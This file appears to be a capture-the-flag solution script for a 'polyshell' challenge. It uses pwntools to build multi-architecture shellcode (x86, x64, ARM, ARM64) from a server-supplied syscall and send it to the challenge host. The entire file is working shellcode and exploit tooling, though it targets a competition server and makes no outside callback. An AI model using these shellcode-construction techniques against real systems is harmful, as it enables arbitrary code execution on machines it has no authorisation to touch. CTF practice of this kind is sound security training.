import binascii
from pwn import *
import subprocess

host = 'polyshell-01.play.midnightsunctf.se'
port = 30000

s = remote(host, port)
s.recvuntil('Syscall number: ')
syscall = int(s.recvline().decode())
s.recvuntil('Argument 1: ')
arg1 = int(s.recvline().decode())
s.recvuntil('string ')
string = s.recvline().decode().strip('"\n')
s.recv(4096)
log.info('Syscall: {}'.format(syscall))
log.info('Arg1: {}'.format(arg1))
log.info('Arg2: {}'.format(string))

code_32 = '''BITS 32

jmp short one

two:
pop ecx
xor eax, eax
mov al, '''+str(syscall)+'''
xor ebx, ebx
mov bx, '''+str(arg1)+'''
int 0x80
xor eax, eax
mov al, 1
xor ebx, ebx
int 0x80

one:
call two
db "'''+string+'''", 0x00
'''
code_64 = '''BITS 64

jmp short one

two:
xor rax, rax
mov al, '''+str(syscall)+'''
xor rdi, rdi
mov di, '''+str(arg1)+'''
pop rsi
syscall
xor rax, rax
mov al, 60
xor rdi, rdi
syscall

one:
call two
db "'''+string+'''", 0x00
'''
code_arm = '''
.section .text
.global _start

_start:
.code 32
add r3, pc, #1
bx r3

.code 16
mov r1, pc
add r1, #12
eor r2, r2, r2
strb r2, [r1, #'''+str(len(string))+''']
mov r7, #'''+str(syscall)+'''
ldr r0,='''+str(arg1)+'''
svc #1

.ascii "'''+string+'''x"
'''
code_arm64 = '''
.section .text
.global _start

_start:
adr x1, #8
mov x8, #'''+str(syscall)+'''
ldr x0,='''+str(arg1)+'''
svc #1

string:
.asciz "'''+string+'''"
'''
with open('test_32.s', 'w') as f:
    f.write(code_32)
with open('test_64.s', 'w') as f:
    f.write(code_64)
with open('test_arm.s', 'w') as f:
    f.write(code_arm)
with open('test_arm64.s', 'w') as f:
    f.write(code_arm64)

subprocess.run('nasm test_32.s', shell=True)
subprocess.run('nasm test_64.s', shell=True)
subprocess.run('arm-linux-gnueabi-as -march=armv8.3-a test_arm.s -o test_arm.o', shell=True)
subprocess.run('aarch64-linux-gnu-as -march=armv8.3-a test_arm64.s -o test_arm64.o', shell=True)
with open('test_32', 'rb') as f:
    shellcode_32 = binascii.hexlify(f.read()).decode()
with open('test_64', 'rb') as f:
    shellcode_64 = binascii.hexlify(f.read()).decode()
with open('test_arm.o', 'rb') as f:
    temp = f.read()
temp = binascii.hexlify(temp).decode()
start = 0x68
end = temp.find('4124')
shellcode_arm = temp[start:end]
with open('test_arm64.o', 'rb') as f:
    temp = f.read()
temp = binascii.hexlify(temp).decode()
start = 0x80
end = start + 32 + len(string)*2 + 2
shellcode_arm_64 = temp[start:end]
log.info("Shellcode ARM64:")
log.info(shellcode_arm_64)

offset_86 = hex(2+len(shellcode_arm)//2)[2:].zfill(2)
switch_86_arm = 'eb'+offset_86+'0032'
offset_64 = hex(len(shellcode_32)//2)[2:]
switch_32_64 = '31c04074'+offset_64
shellcode_arm_32_64 = switch_86_arm + shellcode_arm + switch_32_64 + shellcode_32 + shellcode_64

log.info('Switch x86/ARM: (len {})'.format(len(switch_86_arm)//2))
log.info(switch_86_arm)
log.info('Shellcode ARM: (len {})'.format(len(shellcode_arm)//2))
log.info(shellcode_arm)
log.info('Switch x86/x64: (len {})'.format(len(switch_32_64)//2))
log.info(switch_32_64)
log.info('Shellcode x86: (len {})'.format(len(shellcode_32)//2))
log.info(shellcode_32)
log.info('Shellcode x64: (len {})'.format(len(shellcode_64)//2))
log.info(shellcode_64)
log.info('Complete shellcode:')
log.info(shellcode_arm_32_64)




s.sendline(shellcode_arm_64)
print(s.recv(4096).decode())


